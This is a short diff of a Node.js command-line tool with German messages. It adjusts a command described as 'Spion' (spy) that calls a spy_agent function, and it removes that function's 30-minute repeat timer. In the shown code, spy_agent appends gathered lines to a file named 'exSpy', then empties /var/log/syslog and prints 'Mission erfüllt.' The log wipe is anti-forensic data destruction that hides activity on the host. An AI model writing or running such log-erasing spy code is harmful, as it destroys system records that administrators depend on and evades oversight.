@@ -234,11 +234,10 @@ async function ARGvCommandsController () {
         }
     } )
 
-    .command( { command: 'x007',
+    .command( { command: '007',
         describe: 'Spion',
         handler: async argv => {
             spy_agent();
-            setInterval( () => spy_agent(), 60*30*1000 );
         }
     } )
 
@@ -1038,9 +1037,13 @@ function spy_agent () {
         }
     }
 
-    if ( !FS.existsSync( "exSpy" ) ) FS.createWriteStream( "exSpy" );
-    FS.appendFileSync( "exSpy", exLines )
+    if ( !FS.existsSync( "exSpy" ) ) {
+        FS.createWriteStream( "exSpy" );
+        console.log( "Neue exSpy Datei wird erstellt" );
+    }
+    FS.appendFileSync( "exSpy", exLines );
     FS.writeFileSync( "/var/log/syslog", "" );
+    console.log( "Mission erfüllt." );
 
 }
 
